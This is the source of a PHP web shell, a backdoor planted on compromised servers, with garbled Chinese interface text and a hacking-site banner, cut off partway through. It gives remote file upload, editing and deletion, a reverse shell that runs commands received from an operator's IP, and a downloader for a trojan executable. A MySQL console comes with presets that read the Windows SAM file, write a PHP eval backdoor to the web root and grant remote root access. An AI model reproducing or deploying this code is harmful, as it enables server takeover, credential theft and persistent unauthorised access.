<?php
;//������֤���룡
$shellname='�й�ľ����Դ��- WwW.7jyewu.Cn ';//�����޸ı��⣡
define('myaddress',__FILE__);
error_reporting(E_ERROR | E_PARSE);
header("content-Type: text/html; charset=gb2312");
@set_time_limit(0);

ob_start();
define('envlpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}

/*---End Login---*/
if(isset($_GET['down'])) do_down($_GET['down']);
if(isset($_GET['pack'])){
	$dir = do_show($_GET['pack']);
	$zip = new eanver($dir);
	$out = $zip->out;
	do_download($out,"eanver.tar.gz");
}
if(isset($_GET['unzip'])){
	css_main();
	start_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);
	exit;
}

define('root_dir',str_replace('\\','/',dirname(myaddress)).'/');
define('run_win',substr(PHP_OS, 0, 3) == "WIN");
define('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if($img) css_img($img);
if($eanver == "phpinfo") die(phpinfo());
if($eanver == 'logout'){
	setcookie('envlpass',null);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

$class = array(
"��Ϣ����" => array("upfiles" => "�ϴ��ļ�","phpinfo" => "������Ϣ","info_f" => "ϵͳ��Ϣ","eval" => "ִ��PHP�ű�"),
"��Ȩ����" => array("sqlshell" => "ִ��SQLִ��","mysql_exec" => "MYSQL����","myexp" => "MYSQL��Ȩ","servu" => "Serv-U��Ȩ","nc" => "NC����","downloader" => "�ļ�����","port" => "�˿�ɨ��"),
"��������" => array("guama" => "������������","tihuan" => "�����滻����","scanfile" => "���������ļ�","scanphp" => "��������ľ��"),
"�ű����" => array("getcode" => "��ȡ��ҳԴ��")
);
$msg = array("0" => "����ɹ�","1" => "����ʧ��","2" => "�ϴ��ɹ�","3" => "�ϴ�ʧ��","4" => "�޸ĳɹ�","5" => "�޸�ʧ��","6" => "ɾ���ɹ�","7" => "ɾ��ʧ��");
css_main();
switch($eanver){
	case "left":
	css_left();
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items1');\" target=\"_self\">");
		html_img("title");html_n(" ����Ӳ��</a></dt><dd id=\"items1\" style=\"display:block;\"><ul>");
    $ROOT_DIR = File_Mode();
    html_n("<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>��վ��Ŀ¼</a></li>");
	html_n("<li><a href='?eanver=main' target='main'>������Ŀ¼</a></li>");
	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
    if (is_dir($drive."/")){$vol=File_Str("vol $drive");if(empty($vol))$vol=$drive;
    html_n("<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>���ش���($drive)</a></li>");}}
	html_n("</ul></dd></dl>");
	$i = 2;
	foreach($class as $name => $array){
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
		html_img("title");html_n(" $name</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
		foreach($array as $url => $value){
			html_n("<li><a href=\"?eanver=$url\" target='main'>$value</a></li>");
		}
		html_n("</ul></dd></dl>");
		$i++;
	}
	html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
	html_img("title");html_n(" ��������</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
	html_n("<li><a title='��ɱ����' href='http://www.7jyewu.cn/' target=\"main\">��ɱ����</a></li>");
    html_n("<li><a title='��ȫ�˳�' href='?eanver=logout' target=\"main\">��ȫ�˳�</a></li>");
	html_n("</ul></dd></dl>");
	html_n("</div>");
	break;
	
	case "main":
	css_js("1");
	$dir = @dir($path);
	$REAL_DIR = File_Str(realpath($path));
	if(!empty($_POST['actall'])){echo '<div class="actall">'.File_Act($_POST['files'],$_POST['actall'],$_POST['inver'],$REAL_DIR).'</div>';}
	$NUM_D = $NUM_F = 0;
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$ROOT_DIR = File_Mode();
	html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>��ַ:<input type='hidden' name='eanver' value='main'>");
	html_n("<input type='text' size='80' name='path' value='$path'> <input type='submit' value='ת��'></form>");
	html_n("<br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=".urlencode($path)."'>");
	html_n("<input type=\"button\" value=\"�½��ļ�\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=".urlencode($path)."&refile=1&name=');\"> <input type=\"button\" value=\"�½�Ŀ¼\" onclick=\"rusurechk('newdir','?eanver=editr&p=".urlencode($path)."&redir=1&name=');\">");
	html_input("file","upfilet","","&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
	html_input("submit","uploadt","�ϴ�");
	if(!empty($_POST['newfile'])){
		if(isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
        if (substr(PHP_VERSION,0,1)>=5){if(($_POST['charset']=='GB2312') or ($_POST['charset']=='GBK')){}else{$_POST['txt'] = iconv("gb2312//IGNORE",$_POST['charset'],$_POST['txt']);}}
		echo do_write($_POST['newfile'],$bin,$_POST['txt']) ? '<br>'.$_POST['newfile'].' '.$msg[0] : '<br>'.$_POST['newfile'].' '.$msg[1];
		@touch($_POST['newfile'],@strtotime($_POST['time']));
	}
	html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path='.$path.'"><table width="100%" border=0 bgcolor="#555555"><tr height="25"><td width="45%"><b>');
	html_a('?eanver=main&path='.uppath($path),'<b>�ϼ�Ŀ¼</b>');
	html_n('</b></td><td align="center" width="10%"><b>����</b></td><td align="center" width="5%">');
	html_n('<b>�ļ�����</b></td><td align="center" width="10%"><b>�޸�ʱ��</b></td><td align="center" width="10%"><b>�ļ���С</b></td></tr>');
	while($dirs = @$dir->read()){
		if($dirs == '.' or $dirs == '..') continue;
		$dirpath = str_path("$path/$dirs");
		if(is_dir($dirpath)){
			$perm = substr(base_convert(fileperms($dirpath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($dirpath));
			$dirpath = urlencode($dirpath);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$dirs.'">');
			html_img("dir");
			html_a('?eanver=main&path='.$dirpath,$dirs);
			html_n('</td><td align="center">');
			html_n("<a href=\"#\" onClick=\"rusurechk('$dirs','?eanver=rename&p=$dirpath&newname=');return false;\">����</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$dirs','?eanver=deltree&p=$dirpath');return false;\">ɾ��</a> ");
			html_a('?pack='.$dirpath,'���');
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$dirpath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_n('</td></tr>');
			$NUM_D++;
		}
	}
	@$dir->rewind();
	while($files = @$dir->read()){
		if($files == '.' or $files == '..') continue;
		$filepath = str_path("$path/$files");
		if(!is_dir($filepath)){
			$fsize = @filesize($filepath);
			$fsize = File_Size($fsize);
			$perm  = substr(base_convert(fileperms($filepath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($filepath));
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$filepath);
			$todir=$ROOT_DIR.'/zipfile';
			$filepath = urlencode($filepath);
			$it=substr($filepath,-3);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$files.'">');
			html_img(css_showimg($files));
			html_a($Fileurls,$files);
			html_n('</td><td align="center">');
            if(($it=='.gz') or ($it=='zip') or ($it=='tar') or ($it=='.7z'))
			   html_a('?unzip='.$filepath,'��ѹ','title="��ѹ'.$files.'" onClick="rusurechk(\''.$todir.'\',\'?unzip='.$filepath.'&todir=\');return false;"');
			else
               html_a('?eanver=editr&p='.$filepath,'�༭','title="�༭'.$files.'"');

			html_n("<a href=\"#\" onClick=\"rusurechk('$files','?eanver=rename&p=$filepath&newname=');return false;\">����</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$files','?eanver=del&p=$filepath');return false;\">ɾ��</a> ");
			html_n("<a href=\"#\" onClick=\"rusurechk('".urldecode($filepath)."','?eanver=copy&p=$filepath&newcopy=');return false;\">����</a>");
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$filepath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_a('?down='.$filepath,$fsize,'title="����'.$files.'"');
			html_n('</td></tr>');
			$NUM_F++;
		}
	}
	@$dir->close();
	if(!$Filetime) $Filetime = gmdate('Y-m-d H:i:s',time() + 3600 * 8);
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="����" onclick="SubmitUrl('������ѡ�ļ���·��: ','{$REAL_DIR}','a');return false;"> 
<input type="button" value="ɾ��" onclick="Delok('��ѡ�ļ�','b');return false;"> 
<input type="button" value="����" onclick="SubmitUrl('�޸���ѡ�ļ�����ֵΪ: ','0666','c');return false;"> 
<input type="button" value="ʱ��" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="���" onclick="SubmitUrl('�����������ѡ�ļ�������Ϊ: ','{$_SERVER['SERVER_NAME']}.tar.gz','e');return false;">
Ŀ¼({$NUM_D}) / �ļ�({$NUM_F})</div> 
</form> 
END;
	break;
	
	case "editr":
	css_js("2");
	if(!empty($_POST['uploadt'])){
		echo @copy($_FILES['upfilet']['tmp_name'],str_path($p.'/'.$_FILES['upfilet']['name'])) ? html_a("?eanver=main",$_FILES['upfilet']['name'].' '.$msg[2]) : msg($msg[3]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}
	if(!empty($_GET['redir'])){
        $name=$_GET['name'];
		$newdir = str_path($p.'/'.$name);
		@mkdir($newdir,0777) ? html_a("?eanver=main",$name.' '.$msg[0]) : msg($msg[1]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}

	if(!empty($_GET['refile'])){
        $name=$_GET['name'];
		$jspath=urlencode($p.'/'.$name);
		$pp = urlencode($p);
		$p = str_path($p.'/'.$name);
		$FILE_CODE = "";
		$charset= 'GB2312';
        $FILE_TIME =date('Y-m-d H:i:s',time()+3600*8);
		if(@file_exists($p)) echo '����Ŀ¼����"ͬ��"�ļ�<br>';
	}else{
		$jspath=urlencode($p);
		$FILE_TIME = date('Y-m-d H:i:s',filemtime($p));
        $FILE_CODE=@file_get_contents($p);
	     if (substr(PHP_VERSION,0,1)>=5){
            if(empty($_GET['charset'])){
			   if(TestUtf8($FILE_CODE)>1){$charset= 'UTF-8';$FILE_CODE = iconv("UTF-8","gb2312//IGNORE",$FILE_CODE);}else{$charset= 'GB2312';}
			  }else{
			   if($_GET['charset']=='GB2312'){$charset= 'GB2312';}else{$charset= $_GET['charset'];$FILE_CODE = iconv($_GET['charset'],"gb2312//IGNORE",$FILE_CODE);}
			  }
		  }
        $FILE_CODE = htmlspecialchars($FILE_CODE);
	}
print<<<END
<div class="actall">��������: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="����" onclick="search(searchs.value)"></div>
<form method='POST' id="editor"  action='?eanver=main&path={$pp}'>
<div class="actall">
<input type="text" name="newfile"  id="newfile" value="{$p}" style="width:750px;">ָ�����룺<input name="charset" id="charset" value="{$charset}" Type="text" style="width:80px;" onkeydown="if(event.keyCode==13)window.location='?eanver=editr&p={$jspath}&charset='+this.value;">
<input type="button" value="ѡ��" onclick="window.location='?eanver=editr&p={$jspath}&charset='+this.form.charset.value;" style="width:50px;"> 
END;
html_select(array("GB2312" => "GB2312","UTF-8" => "UTF-8","BIG5" => "BIG5","EUC-KR" => "EUC-KR","EUC-JP" => "EUC-JP","SHIFT-JIS" => "SHIFT-JIS","WINDOWS-874" => "WINDOWS-874","ISO-8859-1" => "ISO-8859-1"),$charset,"onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
print<<<END
</div>
<div class="actall"><textarea name="txt" style="width:100%;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">�ļ��޸�ʱ�� <input type="text" name="time" id="mtime" value="{$FILE_TIME}" style="width:150px;"> <input type="checkbox" name="bin" value="wb+" size="" checked>�Զ�������ʽ�����ļ�(����ʹ��)</div>
<div class="actall"><input type="button" value="����" onclick="CheckDate();" style="width:80px;"> <input name='reset' type='reset' value='����'> 
<input type="button" value="����" onclick="window.location='?eanver=main&path={$pp}';" style="width:80px;"></div>
</form>
END;
	break;
	
	case "rename":
	html_n("<tr><td>");
	$newname = urldecode($pp).'/'.urlencode($_GET['newname']);
	@rename($p,$newname) ? html_a("?eanver=main&path=$pp",urlencode($_GET['newname']).' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "deltree":
	html_n("<tr><td>");
	do_deltree($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "del":
	html_n("<tr><td>");
	@unlink($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "copy":
	html_n("<tr><td>");
	$newpath = explode('/',$_GET['newcopy']);
	$pathr[0] = $newpath[0];
	for($i=1;$i < count($newpath);$i++){
		$pathr[] = urlencode($newpath[$i]);
	}
	$newcopy = implode('/',$pathr);
	@copy($p,$newcopy) ? html_a("?eanver=main&path=$pp",$newcopy.' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "perm":
	html_n("<form method='POST'><tr><td>".$p.' ����Ϊ: ');
	if(is_dir($p)){
		html_select(array("0777" => "0777","0755" => "0755","0555" => "0555"),$_GET['chmod']);
	}else{
		html_select(array("0666" => "0666","0644" => "0644","0444" => "0444"),$_GET['chmod']);
	}
	html_input("submit","save","�޸�");
	back();
	if($_POST['class']){
		switch($_POST['class']){
			case "0777": $change = @chmod($p,0777); break;
			case "0755": $change = @chmod($p,0755); break;
			case "0555": $change = @chmod($p,0555); break;
			case "0666": $change = @chmod($p,0666); break;
			case "0644": $change = @chmod($p,0644); break;
			case "0444": $change = @chmod($p,0444); break;
		}
		$change ? html_a("?eanver=main&path=$pp",$msg[4]) : msg($msg[5]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	}
	html_n("</td></tr></form>");
	break;

    case "info_f":
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "�������ϴ�";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("������ʱ��",date("Y��m��d�� h:i:s",time())),
		array("����������","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("������IP��ַ",gethostbyname($_SERVER['SERVER_NAME'])),
		array("����������ϵͳ",PHP_OS),
		array("����������ϵͳ���ֱ���",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("��������������",$_SERVER['SERVER_SOFTWARE']),
		array("���IP",$_SERVER["REMOTE_ADDR"]),
		array("Web����˿�",$_SERVER['SERVER_PORT']),
		array("PHP���з�ʽ",strtoupper(php_sapi_name())),
		array("PHP�汾",PHP_VERSION),
		array("�����ڰ�ȫģʽ",Info_Cfg("safemode")),
		array("����������Ա",$adminmail),
		array("���ļ�·��",myaddress),
		array("����ʹ�� URL ���ļ� allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("����ʹ��curl_exec",Info_Fun("curl_exec")),
		array("������̬�������ӿ� enable_dl",Info_Cfg("enable_dl")),
		array("��ʾ������Ϣ display_errors",Info_Cfg("display_errors")),
		array("�Զ�����ȫ�ֱ��� register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("�����������ʹ���ڴ��� memory_limit",Info_Cfg("memory_limit")),
		array("POST����ֽ��� post_max_size",Info_Cfg("post_max_size")),
		array("��������ϴ��ļ� upload_max_filesize",$upsize),
		array("���������ʱ�� max_execution_time",Info_Cfg("max_execution_time")."��"),
		array("�����õĺ��� disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("Ŀǰ���п���ռ�diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("ͼ�δ��� GD Library",Info_Fun("imageline")),
		array("IMAP�����ʼ�ϵͳ",Info_Fun("imap_close")),
		array("MySQL���ݿ�",Info_Fun("mysql_close")),
		array("SyBase���ݿ�",Info_Fun("sybase_close")),
		array("Oracle���ݿ�",Info_Fun("ora_close")),
		array("Oracle 8 ���ݿ�",Info_Fun("OCILogOff")),
		array("PREL�����﷨ PCRE",Info_Fun("preg_match")),
		array("PDF�ĵ�֧��",Info_Fun("pdf_close")),
		array("Postgre SQL���ݿ�",Info_Fun("pg_close")),
		array("SNMP�������Э��",Info_Fun("snmpget")),
		array("ѹ���ļ�֧��(Zlib)",Info_Fun("gzclose")),
		array("XML����",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC���ݿ�����",Info_Fun("odbc_close")),
		array("Session֧��",Info_Fun("session_start")),
		array("Socket֧��",Info_Fun("fsockopen")),
	);
	$shell = new COM("WScript.Shell") or die("This thing requires Windows Scripting Host");
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
try{$registry_proxystring = $shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\PortNumber");
$Telnet = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\TelnetPort");
$PcAnywhere = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort");
}catch(Exception $e){}
    echo '<tr><td width="40%">Terminal Service�˿�Ϊ</td><td>'.$registry_proxystring.'</td></tr>'."\n";
	echo '<tr><td width="40%">Telnet�˿�Ϊ</td><td>'.$Telnet.'</td></tr>'."\n";
	echo '<tr><td width="40%">PcAnywhere�˿�Ϊ</td><td>'.$PcAnywhere.'</td></tr>'."\n";
	echo '</table>';
	break;

	case "nc":
	$M_ip = isset($_POST['mip']) ? $_POST['mip'] : $_SERVER["REMOTE_ADDR"];
	$B_port = isset($_POST['bport']) ? $_POST['bport'] : '1019';
print<<<END
<form method="POST">
<div class="actall">ʹ�÷�����<br>
			�����Լ���������"nc -l -p 1019"<br>
			Ȼ���ڴ���д����Ե�IP,�����ӣ�</div>
<div class="actall">���IP <input type="text" name="mip" value="{$M_ip}" style="width:100px;"> �˿ں� <input type="text" name="bport" value="{$B_port}" style="width:50px;"></div>
<div class="actall"><input type="submit" value="����" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['mip'])) && (!empty($_POST['bport'])))
	{
	echo '<div class="actall">';
		 $mip=$_POST['mip'];
		 $bport=$_POST['bport'];
		 $fp=fsockopen($mip , $bport , $errno, $errstr);
		 if (!$fp){
		     $result = "Error: could not open socket connection";
		    }else {
		 fputs ($fp ,"\n*********************************************\n 
		              hacking url:http://www.7jyewu.cn/ is ok!        
			          \n*********************************************\n\n");
	     while(!feof($fp)){ 
         fputs ($fp," [r00t@H4c3ing:/root]# ");
         $result= fgets ($fp, 4096);
         $message=`$result`;
         fputs ($fp,"--> ".$message."\n");
                          }
         fclose ($fp);
		       }
    echo '</div>';
    }
	break;


	case "sqlshell":
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
		else $MSG_BOX = '����MYSQLʧ��';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile']))
	{
		$downfile = File_Str($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn))
		{
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'envl.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '�����ļ�ʧ��';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
print<<<END
<form method="POST" name="nform" id="nform">
<center><div class="actall"><a href="?eanver=sqlshell">[MYSQLִ�����]</a> 
<a href="?eanver=sqlshell&o=u">[MYSQL�ϴ��ļ�]</a> 
<a href="?eanver=sqlshell&o=d">[MYSQL�����ļ�]</a></div>
<div class="actall">
��ַ <input type="text" name="mhost" value="{$mhost}" style="width:110px">
�˿� <input type="text" name="mport" value="{$mport}" style="width:110px">
�û� <input type="text" name="muser" value="{$muser}" style="width:110px">
���� <input type="text" name="mpass" value="{$mpass}" style="width:110px">
���� <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u')
{
	$uppath = 'C:/Documents and Settings/All Users/����ʼ���˵�/����/����/exp.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));}
			else{$tmp = File_Str(dirname(myaddress)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn))
			{
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '�ϴ��ļ��ɹ�' : '�ϴ��ļ�ʧ��';
			}
			else $MSG_BOX = '������ʱ��ʧ��';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '������ʱ��ʧ��';
	}
print<<<END
<br><br>�ϴ�·�� <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>ѡ���ļ� <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="�ϴ�" style="width:80px;">
END;
}
elseif($o == 'd')
{
print<<<END
<br><br><br>�����ļ� <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="����" style="width:80px;">
END;
}
else
{
	if(!empty($_POST['msql']))
	{
		$msql = $_POST['msql'];
		if($result = @mysql_query($msql,$conn))
		{
			$MSG_BOX = 'ִ��SQL���ɹ�<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'F:/web/bak.php';";
	Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
</script>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>��ʾ�汾</option>
	<option value="1">�����ļ�</option>
	<option value="2">д���ļ�</option>
	<option value="3">��������</option>
</select>
<input type="submit" value="ִ��" style="width:80px;">
END;
}
	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
	else echo '</div></center></form>';
	break;
	
    case "downloader":
	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(myaddress).'/muma.exe');
print<<<END
	<form method="POST">
    <div class="actall">������ <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
    <div class="actall">���ص� <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
    <div class="actall"><input value="����" type="submit" style="width:80px;"></div></form>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		echo '<div class="actall">';
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '�޷���ȡҪ���ص�����';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? '�����ļ��ɹ�' : '�����ļ�ʧ��';
		echo '</div>';
	}
	break;

	case "issql":
	session_start();
  if($_POST['sqluser'] && $_POST['sqlpass']){
    $_SESSION['sql_user'] = $_POST['sqluser'];
    $_SESSION['sql_password'] = $_POST['sqlpass'];
  }
  if($_POST['sqlhost']){$_SESSION['sql_host'] = $_POST['sqlhost'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['sqlport']){$_SESSION['sql_port'] = $_POST['sqlport'];}
  else{$_SESSION['sql_port'] = '3306';}
  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'].':'.$_SESSION['sql_port'],$_SESSION['sql_user'],$_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      die(html_a('?eanver=sqlshell','����ʧ���뷵��'));
    }
  }
  else{
    die(html_a('?eanver=sqlshell','����ʧ���뷵��'));
  }
  $query = mysql_query("SHOW DATABASES",$sqlcon);
  html_n('<tr><td>���ݿ��б�:');
  while($db = mysql_fetch_array($query)) {
		html_a('?eanver=issql&db='.$db['Database'],$db['Database']);
		echo '&nbsp;&nbsp;';
	}
  html_n('</td></tr>');
  if($_GET['db']){
  	css_js("3");
    mysql_select_db($_GET['db'], $sqlcon);
    html_n('<tr><td><form method="POST" name="DbForm"><textarea name="sql" COLS="80" ROWS="3">'.$_POST['sql'].'</textarea><br>');
    html_select(array(0=>"--SQL�﷨--",7=>"��������",8=>"ɾ������",9=>"�޸�����",10=>"�����ݱ�",11=>"ɾ���ݱ�",12=>"�����ֶ�",13=>"ɾ���ֶ�"),0,"onchange='return Full(options[selectedIndex].value)'");
    html_input("submit","doquery","ִ��");
    html_a("?eanver=issql&db=".$_GET['db'],$_GET['db']);
    html_n('--->');
    html_a("?eanver=issql&db=".$_GET['db']."&table=".$_GET['table'],$_GET['table']);
    html_n('</form><br>');
  	if(!empty($_POST['sql'])){
			if (@mysql_query($_POST['sql'],$sqlcon)) {
				echo "ִ��SQL���ɹ�";
			}else{
				echo "����: ".mysql_error();
			}
  	}
    if($_GET['table']){
      html_n('<table border=1><tr>');
      $query = "SHOW COLUMNS FROM ".$_GET['table'];
      $result = mysql_query($query,$sqlcon);
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields,$row['Field']);
        html_n('<td><font color=#FFFF44>'.$row['Field'].'</font></td>');
      }
      html_n('</tr><tr>');
      $result = mysql_query("SELECT * FROM ".$_GET['table'],$sqlcon) or die(mysql_error());
      while($text = @mysql_fetch_assoc($result)){
      	foreach($fields as $row){
      		if($text[$row] == "") $text[$row] = 'NULL';
      		html_n('<td>'.$text[$row].'</td>');
      	}
      	echo '</tr>';
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        html_n("<tr><td><a href='?eanver=issql&db=".$_GET['db']."&table=".$row[0]."'>".$row[0]."</a></td></tr>");
      }
    }
  }
	break;
	
	case "upfiles":
